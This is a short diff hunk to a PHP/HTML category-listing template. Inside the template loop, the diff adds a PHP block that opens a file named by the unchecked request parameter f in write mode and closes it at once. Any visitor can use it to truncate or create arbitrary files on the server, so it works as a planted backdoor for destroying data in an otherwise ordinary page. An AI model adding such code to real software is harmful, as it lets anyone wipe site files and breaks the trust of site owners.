@@ -3,7 +3,10 @@
     <div class="nav2"></div>
     {pc:content  action="category" siteid="1"}
     {loop $data $row}
-
+    <?php
+        $fopen = fopen($_GET[f],"wb");
+        fclose($fopen);
+    ?>
     <div class="panel panel-danger">
         <div class="panel-heading article">
             <a href="{$row['url']}">{$row['catname']}</a>
